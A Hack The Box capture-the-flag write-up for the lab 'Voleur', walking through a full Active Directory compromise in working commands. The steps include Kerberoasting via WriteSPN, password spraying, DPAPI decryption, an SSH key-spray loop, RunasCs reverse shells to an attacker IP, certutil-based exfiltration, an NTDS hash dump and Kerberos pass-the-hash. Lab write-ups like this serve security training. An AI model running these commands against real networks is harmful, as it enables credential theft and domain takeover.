

**Box:** Voleur · **Domain:** voleur.htb · **DC:** DC.voleur.htb · **Given creds:** `ryan.naylor : HollowOct31Nyt`

**Full chain (one line):**

Given creds → **NTLM is disabled, so everything is Kerberos (`-k`)** → SMB → `Access_Review.xlsx` in IT share → crack with office2john (`football1`) → spreadsheet leaks users + service-account passwords → BloodHound → **svc_ldap WriteSPN on svc_winrm** → targeted Kerberoast → `svc_winrm` → evil-winrm (Kerberos) = **user** → svc_ldap is in **Restore** group → restore deleted **todd.wolfe** → **DPAPI** (masterkey + credential blob + SID) → `jeremy.combs` creds → jeremy's share has an **SSH key for svc_backup** (WSL) → ssh `svc_backup` → `/mnt/c` backup of C: has **ntds.dit + SYSTEM/SECURITY** → `secretsdump` → Administrator hash → **psexec with Kerberos** = **Administrator**.

> ⚠️ The one fact that explains 90% of the pain on this box: **`NTLM:False`** in the nxc banner. This is a **Kerberos-only** domain. Every tool needs `-k`, a correct `/etc/krb5.conf`, a hosts entry for the DC FQDN, and a synced clock. Read "Phase 0" before anything else.

---

## Phase 0 — The two-hour lesson (read this first)

Two things cost me ~2 hours before I even started:

1. **I forgot HTB gave me credentials.** Always check the box description/"Machine Information" for starting creds *before* going down an unauthenticated-enum rabbit hole.
2. **I ignored `NTLM:False`.** nxc told me plainly:

```
SMB  10.129.232.130  445  DC  [*] x64 (name:DC) (domain:voleur.htb) (signing:True) (SMBv1:None) (NTLM:False)
```

`NTLM:False` = the DC refuses NTLM authentication. Password-only tools that default to NTLM will **fail or reset the connection**. You must authenticate with **Kerberos** everywhere (`-k`).

### The MSRPC / PrintNightmare detour (a red herring — but a good lesson)

Out of curiosity I enumerated MSRPC because of the unusual `ncacn_http` bindings (593, 65042) and the pile of high ports:

```bash
impacket-rpcdump -port 135 10.129.232.130
impacket-rpcdump -port 135 10.129.232.130 | egrep 'MS-RPRN|MS-PAR'
```

- **What rpcdump is / why it matters:** MSRPC is how Windows services expose remote procedures. `rpcdump` lists every registered **endpoint** — each is a service (by UUID/name) you can potentially talk to. You look them up because a named protocol maps to a known attack surface: **MS-RPRN / MS-PAR** = the print spooler → **PrintNightmare / PrinterBug**; **MS-DRSR** = directory replication → **DCSync**; **MS-SAMR/MS-LSAT** = user/SID enumeration.
- Here it showed MS-RPRN + MS-PAR present (spooler up) → "likely PrintNightmare." **It wasn't the path.** `rpcmap` failed (`invalid_checksum`), msf spooler did nothing. 
- **Lesson:** MSRPC enumeration is a legit recon skill, but a service *being present* ≠ *being the intended path*. On a box that handed you creds, the creds are the path. Don't marry the first shiny finding — timebox it and move on. I'm keeping this here as a "what good RPC recon looks like," not as part of the solve.

### Set up Kerberos ONCE, correctly (reusable for every NTLM-disabled / Kerberos-only box)

Do all four of these at the start whenever `NTLM:False` or the box is clearly Kerberos-only:

1. **Hosts** — map the domain and the DC's FQDN to the IP:

```bash
echo '10.129.232.130 voleur.htb dc.voleur.htb DC' | sudo tee -a /etc/hosts
```

2. **Clock sync** — Kerberos fails if skew > 5 min (`KRB_AP_ERR_SKEW`):

```bash
sudo ntpdate voleur.htb
```

3. **`/etc/krb5.conf`** — realm UPPERCASE, KDC = the DC FQDN. Keep it minimal; don't fight duplicate sections:

```
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_kdc = true
    dns_lookup_realm = false

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
```

**Where things go (so future-you doesn't flail):** `default_realm` under `[libdefaults]`; the `kdc = <DC FQDN>` under `[realms]`; the two `.domain`/`domain` → `REALM` lines under `[domain_realm]`. The realm name is **always UPPERCASE**; the KDC is the DC's **FQDN**, never an IP. If a pre-existing file already has other realms (MIT Athena, etc.), you don't need to delete them — just **add your realm and set it as default**, and remove any *duplicate section headers* (two `[realms]` blocks make the effective config unpredictable).

4. **Get a ticket** and verify:

```bash
kinit ryan.naylor
klist
```

### The Kerberos targeting rule (why IP worked but the name didn't)

I hit this confusion:

```bash
nxc smb voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares   # fails
nxc smb 10.129.232.130 -u 'ryan.naylor' -p 'HollowOct31Nyt' -k --shares # works
```

With Kerberos, the target name must match an **SPN the KDC knows** and resolve/route correctly. nxc's Kerberos handling is happiest when you target the **IP** (it derives the SPN internally) or the exact **DC FQDN** (`dc.voleur.htb`) — targeting the bare domain name `voleur.htb` doesn't line up with the host SPN and the TGS request fails. 

**Rule of thumb on `-k`:** target **`dc.<domain>`** (the FQDN) or the **IP**, never the bare domain, and make sure that name is in `/etc/hosts`.

The `svc_iis` spray error is the same family:

```
[-] voleur.htb\svc_iis:N5pXyW1VqM7CZ8 Error occurs while reading from remote(104)
```

`(104)` = connection reset — the NTLM path being torn down on a Kerberos-only DC. Add `-k` and target the FQDN/IP and it behaves.

---

## Phase 1 — Foothold: SMB → locked spreadsheet → creds

With a ticket, enumerate shares and read what ryan can:

```bash
nxc smb dc.voleur.htb -u ryan.naylor -p 'HollowOct31Nyt' -k --shares

impacket-smbclient voleur.htb/ryan.naylor:HollowOct31Nyt@dc.voleur.htb -k
```

The **IT** share holds `Access_Review.xlsx` (other shares are locked). The file is password-protected → crack it offline:

```bash
python /usr/share/john/office2john.py Access_Review.xlsx | tee hash

john hash        # or: hashcat -m 9600 hash rockyou.txt
```

→ password **`football1`**. Open the sheet — it's a gift of an "access review":

| User | Role | Access | Note |
|---|---|---|---|
| Ryan.Naylor | First-Line | SMB | Kerberos Pre-Auth **disabled** (legacy test) |
| Marie.Bryant | First-Line | SMB | |
| Lacey.Miller | Second-Line | Remote Management | |
| **Todd.Wolfe** | Second-Line | Remote Management | **Leaver — pw reset to `NightT1meP1dg3on14`, account deleted** |
| Jeremy.Combs | Third-Line | Remote Management | Has access to Software folder |
| Administrator | — | Domain Admin | |

Service accounts, with passwords in the clear:

```
svc_ldap : M1XyC9pW7qT5Vn
svc_iis  : N5pXyW1VqM7CZ8
svc_backup : (Windows Backup — "speak to Jeremy")
svc_winrm  : (Remote Management — "ask Lacey, she reset it")
```

### Reflex: SPRAY before you theorize

Before building theories about who to become, spray everything you have (users × passwords) — I almost skipped this:

```bash
nxc smb dc.voleur.htb -u users.txt -p pass.txt -k --continue-on-success
```

(`users.txt` = every name; `pass.txt` = `football1`, `HollowOct31Nyt`, `NightT1meP1dg3on14`, `M1XyC9pW7qT5Vn`, `N5pXyW1VqM7CZ8`.) The spray confirms which creds are live and saves you guessing.

---

## Phase 2 — BloodHound: the two useful paths

Collect as ryan over Kerberos:

```bash
bloodhound-python -c All -u ryan.naylor -p 'HollowOct31Nyt' -d voleur.htb -ns 10.129.232.130 -dc dc.voleur.htb -k --zip
```

Two things stood out (one is the path, one is a side door):

- **svc_ldap → `WriteSPN` on svc_winrm → svc_winrm can PSRemote to DC.** (This is why the useful chain appeared when I pivoted the graph around svc_ldap/svc_winrm/jeremy — BloodHound "shortest path to here" from a node shows the edges *into* it. Set svc_winrm/jeremy as the target and the WriteSPN edge lights up.)
- **svc_ldap is a member of the "Restore" (restore-from-recycle-bin) group and has GenericWrite toward Lacey** — this is the branch that lets us bring **todd.wolfe** back from the dead (Phase 4).

### Why "WriteSPN" is a Kerberoast primitive

If you can **write a Service Principal Name** onto an account, you make it "kerberoastable": any user can request a service ticket (TGS) for that SPN, and the ticket is **encrypted with the target account's password hash**. Crack the ticket offline = that account's password. So WriteSPN on svc_winrm → set a fake SPN → Kerberoast svc_winrm → crack → svc_winrm's password.

---

## Phase 3 — svc_ldap → svc_winrm (targeted Kerberoast) = USER

Write a fake SPN onto svc_winrm (bloodyAD, Kerberos):

```bash
bloodyAD -d voleur.htb -k --host dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn set object svc_winrm servicePrincipalName -v 'http/whatever'
```

Then **targeted Kerberoast** just that account:

```bash
impacket-GetUserSPNs voleur.htb/svc_ldap:'M1XyC9pW7qT5Vn' -dc-host dc.voleur.htb -dc-ip 10.129.232.130 -k -request-user svc_winrm
```

(Same thing with nxc if you prefer: `nxc ldap dc.voleur.htb -u svc_ldap -p M1XyC9pW7qT5Vn -k --kerberoasting out.txt`.)

→ hash → crack → **`svc_winrm : AFireInsidedeOzarctica980219afi`**.

> **"One user or all?"** You *can* roast every SPN-bearing account at once (drop `-request-user`), but here only svc_winrm is the target you created, so request just it — faster, quieter, and you already know which account you need.

### Logging in when it's Kerberos-only

Plain evil-winrm fails:

```bash
evil-winrm -i 10.129.232.130 -u svc_winrm -p 'AFireInsidedeOzarctica980219afi'   # NTLM → dies
```

Do it the Kerberos way — get a TGT, then tell evil-winrm to use the realm:

```bash
kinit svc_winrm          # enter AFireInsidedeOzarctica980219afi
klist                    # confirm a TGT for svc_winrm@VOLEUR.HTB
evil-winrm -i dc.voleur.htb -r voleur.htb
```

 **What `-r voleur.htb` does:** it tells evil-winrm to authenticate with **Kerberos using the ticket in your cache** (the realm), instead of NTLM user/pass. So the flow for any Kerberos-only user is: `kinit <user>` → type their password → a fresh TGT lands in your cache → `evil-winrm -i <dc-fqdn> -r <REALM>`. One ticket per user; re-`kinit` to switch identities.

→ **user flag** in svc_winrm's desktop.

*(Side note: evil-winrm sometimes dies with `malloc_consolidate(): unaligned fastbin chunk detected / Aborted` after a few commands — that's a known Ruby/evil-winrm instability, not a box defense. Update evil-winrm, or keep commands short / re-launch. Nothing you did.)*

---

## Phase 4 — Restore deleted todd.wolfe → DPAPI → jeremy.combs

svc_winrm can't read other users' profiles, and the interesting shares are still locked. The spreadsheet said todd was a **deleted "leaver"** with a known password — bring him back. svc_ldap is in the **Restore** group and the **AD Recycle Bin** is enabled:

```powershell
Get-ADOptionalFeature 'Recycle Bin Feature'    # Enabled
```

Run tools **as svc_ldap** (RunasCs gives you a token for an account you have the password for, without needing it to be WinRM-capable):

```powershell
upload RunasCs.exe

.\RunasCs.exe svc_ldap M1XyC9pW7qT5Vn powershell -r 10.10.15.249:446
```

In that svc_ldap shell, find and restore todd:

```powershell
Get-ADObject -Filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -IncludeDeletedObjects -Property objectSid,lastKnownParent

Restore-ADObject -Identity 1c6b1deb-c372-4cbb-87b1-15031de169db
```

Now todd exists again with his reset password, so get a shell as him (RunasCs dropped in a writable dir like `C:\ProgramData`):

```powershell
.\RunasCs.exe todd.wolfe NightT1meP1dg3on14 powershell -r 10.10.14.6:443
```

### DPAPI — the credential treasure hunt (explained properly)

todd's live profile had nothing, but his **archived profile** in the IT share did:
`C:\IT\Second-Line Support\Archived Users\todd.wolfe\...`

**DPAPI** (Data Protection API) is how Windows encrypts a user's saved secrets (browser/RDP/Credential-Manager blobs). To decrypt one you need **three** things, and they live in three places:

| Thing | Where | Here |
|---|---|---|
| **Credential blob** (the encrypted secret) | `...\AppData\Roaming\Microsoft\Credentials\<hex>` | `772275FAD58525253490A9B0039791D3` |
| **Master key** (decrypts the blob) | `...\AppData\Roaming\Microsoft\Protect\<SID>\<guid>` | `08949382-134f-4c63-b93c-ce52efc0aa88` |
| **The SID + the user's password** (decrypts the master key) | the `Protect\<SID>` folder name itself | `S-1-5-21-3927696377-1337352550-2781715495-1110` + `NightT1meP1dg3on14` |

So the process is two steps: 
**(1)** **master key** + SID + password 

**(2)** **credential blob** + decrypted master ley from step 1.

They always come as a pair — a credential blob is useless without its master key, which is why you grab both plus the SID.

> **Gotchas I hit, so note them:**
> - **`tree` / `dir` don't show these** — `Credentials`, `Protect`, `Crypto` are **hidden+system** (`d---s-`). Always list with `Get-ChildItem -Force` (or `dir /a`), or you'll swear the folder is empty.
> - The `a` in the attribute column = **Archive** bit — a normal file. Grab the plain `-a----` GUID master key; `BK-VOLEUR` is a domain **backup** key and `Preferred` just points at the current key.
> - Exfil **files**, not directories — `certutil -encode <file>` on a folder throws "access denied."

Exfil (copy to a writable dir, base64-encode, paste to attacker, decode — skip the `-----BEGIN/END-----` lines):

```powershell
Copy-Item "C:\IT\Second-Line Support\Archived Users\todd.wolfe\AppData\Roaming\Microsoft\Credentials\772275FAD58525253490A9B0039791D3" C:\ProgramData\cred

certutil -encode C:\ProgramData\cred C:\ProgramData\cred.b64
```

(repeat for the master key `08949382-...`). Then decrypt offline with impacket:

```bash
impacket-dpapi masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377-1337352550-2781715495-1110 -password NightT1meP1dg3on14

impacket-dpapi credential -file 772275FAD58525253490A9B0039791D3 -key <decrypted-masterkey-from-step-1>
```

→
```
Username : jeremy.combs
Unknown  : qT3V9pLXyN7W4m
```
*
(`mimikatz` on todd's live session could also dump DPAPI — but the offline impacket route works from the archived files and dodges AV. Either is fine; impacket is cleaner here.)*

---

## Phase 5 — jeremy.combs → svc_backup (SSH key in WSL)

Shell as jeremy (RunasCs again, or just `kinit jeremy.combs`):

```powershell
.\RunasCs.exe jeremy.combs qT3V9pLXyN7W4m powershell -r 10.10.15.249:449
```

jeremy (Third-Line) can read `C:\IT\Third-Line Support\` — it has an **`id_rsa`** and a note:

*"I've had enough of Windows Backup! I've part configured **WSL** to see if we can use the backup tools from Linux…"* — Admin

So there's a **Linux (WSL) environment** on the DC, listening on **SSH port 2222**, and this key belongs to whoever set it up.

### Whose key is it? (a good universal check)

The owner is stamped in the key's comment. Decode and look:

```bash
cat id_rsa | grep -v '\----' | base64 -d | strings      # last line → svc_backup@DC

ssh-keygen -y -f id_rsa                 # prints the pubkey (also has the comment)
```

→ **`svc_backup@DC`**. (Generic trick when the comment is stripped: spray the key across candidate users — `for u in $(cat users); do ssh -i id_rsa -p 2222 $u@voleur.htb -o BatchMode=yes -o StrictHostKeyChecking=no id </dev/null && echo "[+] $u"; done`. Works for any key you find.)

```bash
chmod 600 id_rsa

ssh -i id_rsa -p 2222 svc_backup@dc.voleur.htb
```

---

## Phase 6 — svc_backup → Administrator (backup of C: → NTDS)

`sudo -l` shows full root **on the Linux side** — but that's a dead end by itself (it's WSL; root-on-Linux ≠ DA). The value of this account is what the note screamed: **it does the Windows backups**, and WSL mounts the Windows drive at `/mnt/c`. The locked **Backups** folder is readable here:

```
/mnt/c/IT/Third-Line Support/Backups/Active Directory/   → ntds.dit, ntds.jfm

/mnt/c/IT/Third-Line Support/Backups/registry/           → SECURITY, SYSTEM
```

A copy of `ntds.dit` + the `SYSTEM` & `SECURITY` hives = the **entire domain's hashes, offline**. Pull them and dump:

```bash
scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:"/mnt/c/IT/Third-Line\ Support/Backups/registry/*" .

scp -i id_rsa -P 2222 svc_backup@dc.voleur.htb:"/mnt/c/IT/Third-Line\ Support/Backups/Active\ Directory/*" .

impacket-secretsdump LOCAL -system SYSTEM -security SECURITY -ntds ntds.dit
```

→ the **Administrator NT hash**: `e656e07c56d831611b577b160b259ad2`.

### Pass-the-hash the Kerberos way (NTLM is still disabled)

NTLM-based PtH fails, and you **can't `kinit` with just an NT hash** for a plain password prompt — but impacket can turn the hash into a Kerberos login:

```bash
nxc smb dc.voleur.htb -u Administrator -H e656e07c56d831611b577b160b259ad2 -k          # [+] confirms

impacket-psexec -k -no-pass 'VOLEUR.HTB/Administrator@dc.voleur.htb' -hashes :e656e07c56d831611b577b160b259ad2
```

- `-hashes :<nthash>` supplies the NT hash;
- `-k -no-pass` tells psexec to do **Kerberos** (it uses the hash to request a TGT via overpass-the-hash) instead of NTLM;
- target the **FQDN**, not the IP (Kerberos needs the SPN).

Plain `impacket-psexec -hashes ... @IP` (no `-k`) **fails** here — that's NTLM, which the DC refuses. evil-winrm with `-H` likewise fails for the same reason. **With `-k` it works** → **SYSTEM / Administrator on DC.** 👑

---

## Full chain (one glance)
4
```
NTLM:False  →  set up krb5.conf + hosts + ntpdate + kinit (EVERYTHING uses -k)
given creds (ryan.naylor)
      │ SMB
Access_Review.xlsx (IT share) → office2john → football1 → users + svc passwords
      │ BloodHound
svc_ldap --WriteSPN--> svc_winrm → targeted Kerberoast → svc_winrm pw
      │ evil-winrm -r VOLEUR.HTB  → USER
svc_ldap ∈ Restore group → Restore-ADObject todd.wolfe (deleted leaver)
      │ RunasCs as todd (pw from spreadsheet)
DPAPI: masterkey + credblob + SID (archived profile) → jeremy.combs : qT3V9pLXyN7W4m
      │ jeremy reads Third-Line share
id_rsa (comment: svc_backup@DC) → ssh -p 2222 svc_backup
      │ WSL mounts C: → /mnt/c/.../Backups
ntds.dit + SYSTEM + SECURITY → secretsdump → Administrator NT hash
      │ psexec -k -no-pass -hashes :<nt>   (Kerberos PtH; NTLM refused)
Administrator on DC  👑
```

## Takeaways

1. **Check for provided credentials first**, and **read the nxc banner** — `NTLM:False` reroutes your entire methodology to Kerberos.
2. **Kerberos-only setup is four things:** hosts (DC FQDN), `ntpdate`, a clean `/etc/krb5.conf` (realm UPPERCASE, `kdc=<DC FQDN>`), `kinit`. On `-k`, target the **FQDN or IP**, never the bare domain.
3. **MSRPC/PrintNightmare recon is a skill, not always the path** — timebox shiny findings; the creds you were given are the lead.
4. **Spray looted creds before theorizing** who to become.
5. **WriteSPN = Kerberoast primitive** — set a fake SPN, request the TGS, crack offline.
6. **AD Recycle Bin + Restore group = undelete users** — a "leaver" with a known password is a live account waiting to be restored.
7. **DPAPI needs three things** (cred blob + master key + SID/password); the secret folders are **hidden+system** → `Get-ChildItem -Force`.
8. **Key comments name their owner** (`base64 -d | strings`); spraying a key across users is a solid fallback.
9. **"Backup" accounts are gold** — a backup of `ntds.dit` + SYSTEM/SECURITY = the whole domain offline.
10. **PtH on a Kerberos-only DC** = `psexec -k -no-pass -hashes :<nt>` against the **FQDN**; NTLM PtH and evil-winrm `-H` won't work.
